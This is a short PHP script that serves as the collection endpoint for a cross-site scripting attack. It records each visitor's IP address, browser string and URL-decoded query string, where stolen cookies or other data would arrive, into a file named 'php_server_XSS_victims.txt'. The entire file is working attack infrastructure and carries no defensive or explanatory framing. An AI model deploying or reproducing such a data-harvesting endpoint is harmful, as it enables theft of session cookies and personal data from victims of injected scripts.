<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$file_handler = fopen('php_server_XSS_victims.txt', 'a');

fwrite($file_handler, $ip.' '.$browser."\n");
fwrite($file_handler, urldecode($_SERVER['QUERY_STRING']). " \n\n");
fclose($file_handler);

?>